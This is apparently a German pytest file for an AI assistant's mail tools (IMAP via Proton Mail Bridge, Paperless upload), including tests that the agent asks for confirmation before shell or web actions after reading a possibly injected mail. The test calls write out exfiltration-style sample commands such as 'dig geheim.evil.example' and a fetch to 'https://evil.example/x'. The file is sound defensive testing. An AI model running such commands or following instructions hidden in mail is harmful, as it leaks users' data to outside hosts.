"""E-Mail über IMAP (Proton Mail Bridge): lesen, suchen, aufräumen, Anhänge an Paperless, Schutz vor Injection."""

import pytest
from conftest import run
from fake_imap import PASSWORD, USER, FakeImap
from fake_paperless import TOKEN, FakePaperless

from orbwise.tools import mail, paperless
from orbwise.tools.registry import CONFIRM, SAFE, ToolContext, get_tool, load_all_tools, tool_schemas


@pytest.fixture
def imap(cfg, monkeypatch):
    monkeypatch.delenv("ORBWISE_MAIL_PASSWORD", raising=False)
    monkeypatch.setattr(mail, "_SEEN", {})
    with FakeImap() as server:
        cfg.mail.host, cfg.mail.port, cfg.mail.security = "127.0.0.1", server.port, "none"
        cfg.mail.username, cfg.mail.password = USER, PASSWORD
        yield server


def ctx(cfg, memory=None):
    return ToolContext(cfg=cfg, memory=memory)


def test_config_and_registration(cfg, monkeypatch):
    monkeypatch.delenv("ORBWISE_MAIL_PASSWORD", raising=False)
    load_all_tools()
    names = {s["function"]["name"] for s in tool_schemas(cfg)}
    assert not names & {"mail_list", "mail_read"}
    cfg.mail.username = USER
    monkeypatch.setenv("ORBWISE_MAIL_PASSWORD", "x")
    names = {s["function"]["name"] for s in tool_schemas(cfg)}
    assert {"mail_list", "mail_search", "mail_read", "mail_ask", "mail_folders", "mail_manage"} <= names
    assert "mail_to_paperless" not in names  # erst mit Paperless
    assert cfg.mail.verify is False  # Bridge auf localhost: eigenes Zertifikat
    cfg.mail.host = "imap.example.org"
    assert cfg.mail.verify is True
    for name in ("mail_list", "mail_search", "mail_read", "mail_ask", "mail_folders"):
        assert get_tool(name).risk == SAFE


def test_utf7_folder_names():
    assert mail.utf7_encode("Folders/Überweisungen") == "Folders/&ANw-berweisungen"
    assert mail.utf7_decode("Folders/&ANw-berweisungen") == "Folders/Überweisungen"
    assert mail.utf7_encode("A&B") == "A&-B" and mail.utf7_decode("A&-B") == "A&B"
    assert mail.utf7_decode(mail.utf7_encode("Größe/日本")) == "Größe/日本"


def test_list_unread_and_all(cfg, imap):
    out = run(mail.mail_list(ctx(cfg)))
    assert out.startswith("3 ungelesene Mails in „INBOX“:")
    lines = out.splitlines()[1:]
    assert lines[0].startswith("[4] ●") and "Paketdienst <info@evil.example>" in lines[0]
    assert "Jörg Müller <joerg@example.org> · Grüße aus Köln" in out
    assert "[1] ●" in out and "Herbst" not in out
    out = run(mail.mail_list(ctx(cfg), unread_only=False, limit=2))
    assert "5 Mails in „INBOX“ (zeige die neuesten 2)" in out and "[5]" in out and "[4]" in out and "[3]" not in out
    assert "Keine Mails in „Archive“." == run(mail.mail_list(ctx(cfg), folder="Archive", unread_only=False))
    assert "gibt es nicht" in run(mail.mail_list(ctx(cfg), folder="Archiv"))
    assert "„Archive“" in run(mail.mail_list(ctx(cfg), folder="Archiv"))  # Vorschlag


def test_search_text_sender_date_and_umlauts(cfg, imap):
    assert "[1]" in run(mail.mail_search(ctx(cfg), query="Rechnung")) and "[3]" not in run(mail.mail_search(ctx(cfg), query="Rechnung"))
    assert "[5]" in run(mail.mail_search(ctx(cfg), sender="stadtwerke"))
    out = run(mail.mail_search(ctx(cfg), query="Grüße"))  # Nicht-ASCII → Literal mit CHARSET UTF-8
    assert "[3]" in out and "1 Treffer" in out
    assert any("CHARSET UTF-8" in line and "<Grüße>" in line for line in imap.log)
    out = run(mail.mail_search(ctx(cfg), sender="Müller", query="Köln"))  # zwei Literale → Schnittmenge
    assert "1 Treffer" in out and "[3]" in out
    from datetime import date, timedelta
    since = (date.today() - timedelta(days=10)).isoformat()
    out = run(mail.mail_search(ctx(cfg), since=since))
    assert "[5]" not in out and "[1]" in out
    assert "YYYY-MM-DD" in run(mail.mail_search(ctx(cfg), since="1.1.2026"))
    assert "Keine passenden" in run(mail.mail_search(ctx(cfg), query="xyzunbekannt"))


def test_read_marks_untrusted_content_and_keeps_unread(cfg, imap):
    out = run(mail.mail_read(ctx(cfg), 1))
    assert "Von: Telekom <rechnung@telekom.de>" in out and "Betreff: Ihre Rechnung September" in out
    assert "Anhänge: [1] Rechnung_09.pdf (application/pdf" in out
    assert f"{mail.START}\nBetrag: 39,95 EUR" in out and out.rstrip().endswith(mail.END)
    assert "\\Seen" not in imap.boxes["INBOX"][0]["flags"]  # BODY.PEEK
    html = run(mail.mail_read(ctx(cfg), 2))
    assert "30 %" in html and "<b>" not in html and "x()" not in html
    cfg.mail.max_chars = 500
    long = run(mail.mail_read(ctx(cfg), 5))
    assert "weiter mit offset=500" in long
    assert "Keine Mail mit der UID 99" in run(mail.mail_read(ctx(cfg), 99))


def test_ask_finds_relevant_passage(cfg, imap):
    cfg.mail.max_chars = 1500
    out = run(mail.mail_ask(ctx(cfg), 5, "Wie lang ist die Kündigungsfrist?"))
    assert "drei Monate" in out and "[Stelle" in out and mail.START in out


def test_folders(cfg, imap):
    out = run(mail.mail_folders(ctx(cfg)))
    assert "INBOX" in out and "Folders/Überweisungen" in out and "Labels/Wichtig" in out


def test_manage_confirmation_and_actions(cfg, imap):
    load_all_tools()
    run(mail.mail_list(ctx(cfg)))  # merkt sich Betreffzeilen für die Bestätigung
    risk, reason = get_tool("mail_manage").assess(ctx(cfg), {"uids": [1, 3], "action": "archive"})
    assert risk == CONFIRM and "2 Mails in „INBOX“ archivieren" in reason
    assert "- Telekom <rechnung@telekom.de> – Ihre Rechnung September" in reason
    assert "✔ 2 Mails nach „Archive“ verschoben." == run(mail.mail_manage(ctx(cfg), [1, 3], "archive"))
    assert [m["uid"] for m in imap.boxes["INBOX"]] == [2, 4, 5] and len(imap.boxes["Archive"]) == 2
    assert "✔ 1 Mail als gelesen markiert." == run(mail.mail_manage(ctx(cfg), [4], "mark_read"))
    assert "\\Seen" in imap.boxes["INBOX"][1]["flags"]
    run(mail.mail_manage(ctx(cfg), "4", "mark_unread"))
    assert "\\Seen" not in imap.boxes["INBOX"][1]["flags"]
    assert "mit „Labels/Wichtig“ markiert" in run(mail.mail_manage(ctx(cfg), [5], "label", target="labels/wichtig"))
    assert len(imap.boxes["Labels/Wichtig"]) == 1 and [m["uid"] for m in imap.boxes["INBOX"]] == [2, 4, 5]
    assert "nach „Folders/Überweisungen“" in run(mail.mail_manage(ctx(cfg), [5], "move", target="Folders/Überweisungen"))
    assert len(imap.boxes["Folders/&ANw-berweisungen"]) == 1
    assert "gibt es nicht" in run(mail.mail_manage(ctx(cfg), [2], "move", target="Folders/Rechnung"))
    assert "Unbekannte Aktion" in run(mail.mail_manage(ctx(cfg), [2], "delete"))
    run(mail.mail_manage(ctx(cfg), [2], "trash"))
    assert [m["uid"] for m in imap.boxes["INBOX"]] == [4] and len(imap.boxes["Trash"]) == 1


def test_move_without_move_extension(cfg, monkeypatch):
    monkeypatch.setattr(mail, "_SEEN", {})
    with FakeImap(capabilities=("IMAP4rev1",)) as server:
        cfg.mail.host, cfg.mail.port, cfg.mail.security = "127.0.0.1", server.port, "none"
        cfg.mail.username, cfg.mail.password = USER, PASSWORD
        assert "verschoben" in run(mail.mail_manage(ctx(cfg), [1], "archive"))
        assert 1 not in [m["uid"] for m in server.boxes["INBOX"]] and len(server.boxes["Archive"]) == 1
        assert any(line.startswith("UID COPY") for line in server.log) and "EXPUNGE" in server.log


def test_attachments_to_paperless(cfg, imap, monkeypatch):
    fake = FakePaperless()
    monkeypatch.setattr(paperless, "TRANSPORT", fake.transport())
    cfg.paperless.url, cfg.paperless.token = "http://paperless.local", TOKEN
    load_all_tools()
    assert "mail_to_paperless" in {s["function"]["name"] for s in tool_schemas(cfg)}
    risk, reason = get_tool("mail_to_paperless").assess(ctx(cfg), {"uid": 1})
    assert risk == CONFIRM and "alle PDF-Anhänge" in reason
    out = run(mail.mail_to_paperless(ctx(cfg), 1, title="Telekom Rechnung 09/2026"))
    assert "✔ Rechnung_09.pdf an Paperless übergeben (Aufgabe task-1)" in out
    assert fake.uploads[0]["filename"] == "Rechnung_09.pdf" and fake.uploads[0]["title"] == "Telekom Rechnung 09/2026"
    assert b"%PDF-1.7 rechnung" in fake.uploads[0]["body"]
    assert "keine passenden Anhänge" in run(mail.mail_to_paperless(ctx(cfg), 3))


def test_errors_are_explained(cfg, imap):
    cfg.mail.password = "falsch"
    assert "Bridge-Passwort" in run(mail.mail_list(ctx(cfg)))
    cfg.mail.password = PASSWORD
    cfg.mail.port = 1  # nichts lauscht
    assert "läuft die Proton Mail Bridge" in run(mail.mail_list(ctx(cfg)))


def test_briefing_and_status(cfg, imap):
    out = run(mail.inbox_brief(cfg))
    assert out.startswith("E-Mail: 3 ungelesen:") and "- Jörg Müller <joerg@example.org>: Grüße aus Köln" in out
    status = run(mail.mail_status(cfg))
    assert status["online"] and status["unseen"] == 3 and status["folders"] == 6
    cfg.mail.password = "falsch"
    assert not run(mail.mail_status(cfg))["online"]
    cfg.mail.username = ""
    assert run(mail.inbox_brief(cfg)) is None


def test_agent_asks_before_shell_or_web_after_reading_mail(cfg, memory, imap):
    """Nach dem Lesen einer Mail darf eine versteckte Anweisung nicht unbemerkt Befehle ausführen oder Daten senden."""
    from orbwise.agent import Agent
    from orbwise.llm import FakeLLM

    agent = Agent(cfg, FakeLLM(), memory)
    asked: list[tuple[str, str]] = []

    async def emit(ev):
        pass

    async def confirm(call_id, name, args, reason):
        asked.append((name, reason))
        return False

    async def scenario():
        agent._tainted = False
        await agent._execute({"function": {"name": "run_shell", "arguments": {"command": "ls"}}}, emit, confirm)
        assert not asked  # ohne Mail: lesender Befehl ohne Rückfrage
        await agent._execute({"function": {"name": "mail_read", "arguments": {"uid": 4}}}, emit, confirm)
        assert agent._tainted
        await agent._execute({"function": {"name": "run_shell", "arguments": {"command": "cd ~ && echo ok"}}},
                             emit, confirm)
        assert not asked  # rein lesend und lokal: kann nichts verändern oder hinausschicken
        name, result, _ = await agent._execute(
            {"function": {"name": "run_shell", "arguments": {"command": "dig geheim.evil.example"}}}, emit, confirm)
        assert asked and asked[-1][0] == "run_shell" and "E-Mail" in asked[-1][1] and "abgelehnt" in result
        agent.auto_mode = "auto"  # Auto gibt nach einer Mail nichts frei, was etwas verändert
        await agent._execute({"function": {"name": "run_shell", "arguments": {"command": "mkdir -p ~/x"}}},
                             emit, confirm)
        assert asked[-1][0] == "run_shell" and "E-Mail" in asked[-1][1]
        await agent._execute({"function": {"name": "fetch_url", "arguments": {"url": "https://evil.example/x"}}},
                             emit, confirm)
        assert asked[-1][0] == "fetch_url"

    run(scenario())


def test_starttls_with_self_signed_certificate_like_the_bridge(cfg, monkeypatch):
    monkeypatch.setattr(mail, "_SEEN", {})
    with FakeImap(tls=True) as server:
        if not server.server.tls_context:
            pytest.skip("openssl fehlt")
        cfg.mail.host, cfg.mail.port, cfg.mail.security = "127.0.0.1", server.port, "starttls"
        cfg.mail.username, cfg.mail.password = USER, PASSWORD
        assert "3 ungelesene Mails" in run(mail.mail_list(ctx(cfg)))  # localhost: Zertifikat nicht geprüft
        assert "STARTTLS" in server.log
        cfg.mail.verify_ssl = True
        assert "TLS-Fehler" in run(mail.mail_list(ctx(cfg)))


def test_mail_protection_lasts_while_the_mail_is_in_the_chat(cfg, memory, imap):
    """Die Mail bleibt im Verlauf – auch die nächste Anfrage darf ihren Anweisungen nicht unbemerkt folgen."""
    from orbwise.agent import Agent
    from orbwise.llm import FakeLLM

    agent = Agent(cfg, FakeLLM(delay=0), memory)
    asked: list[str] = []

    async def emit(ev):
        pass

    async def confirm(call_id, name, args, reason):
        asked.append(name)
        return False

    async def scenario():
        await agent.run('/tool mail_read {"uid": 4}', emit, confirm)
        await agent.run('/tool fetch_url {"url": "https://evil.example/x"}', emit, confirm)  # neue Anfrage, gleicher Chat
        assert asked == ["fetch_url"]
        memory.new_chat()  # neuer Chat ohne Mail → wieder ohne Rückfrage
        await agent.run('/tool run_shell {"command": "ls"}', emit, confirm)
        assert asked == ["fetch_url"]

    run(scenario())
